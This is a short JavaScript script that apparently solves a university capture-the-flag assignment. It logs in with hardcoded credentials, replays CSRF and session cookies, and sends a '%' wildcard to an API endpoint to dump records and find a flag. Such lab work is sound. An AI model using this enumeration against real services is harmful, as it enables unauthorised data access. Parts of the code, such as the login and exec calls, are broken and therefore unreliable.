import fetch from "node-fetch";
import { exec } from "child_process";
import util from "util";

const execPro = util.promisify(exec);

// http://assignment-code-warriors.unimelb.life/api/store.php?name=OSCP

const login = (user = "fangtaid", pass = "fangtaid") => {
  console.log("Login ...");
  const url = "http://assignment-code-warriors.unimelb.life/auth.php";
  const data = { user, pass };
  fetch(url, {
    method: "POST",
    body: data,
  }).then((data) => {
    // cannot get the token, only session ID
    const ssid = data.headers.forEach((header) => {
      if (header.match(/sessid/i)) {
        // console.log(header.split(" ")[0]);
        const ssid = header.split(" ")[0];
        return ssid;
      }
    });
  });
};

// Combine and keep Cookie info (CSRF_token & session_id) login
async function cookieLogin(wildCardAttack) {
  const fileName = "getCookie.py";
  await execPro("python" + " " + fileName, function (error, stdout, stderr) {
    if (error) {
      console.log("stderr", error);
    }
    if (stdout) {
      // console.log("stdout", stdout);
      let astr = stdout.split("\r\n").join("");
      //   console.log(astr);
      let [login, status, cookie] = astr.split("...");
      cookie = JSON.parse(cookie);
      // console.log(cookie);
      const { CSRF_token, PHPSESSID } = cookie;
      console.log("CSRF_token is : " + CSRF_token);
      console.log("PHPSESSID is : " + PHPSESSID);
      wildCardAttack(CSRF_token, PHPSESSID);
    }
  });
}

// wildCardAttack
const wildCardAttack = (token, ssid) => {
  const url =
    "http://assignment-code-warriors.unimelb.life/api/store.php?name=%";

  fetch(url, {
    headers: {
      Cookie: `CSRF_token=${token}; PHPSESSID=${ssid}`,
      apikey: "",
    },
  })
    .then((data) => data.json())
    .then((res) => {
      for (const obj of res) {
        const description = obj.Description;
        // console.log(description);
        if (description.match(/flag/i)) {
          console.log(description);
          break;
        }
      }
      // console.log(res)
    })
    .catch((error) => console.log(error));
};

// main;
function main() {
  cookieLogin(wildCardAttack);
}

main();
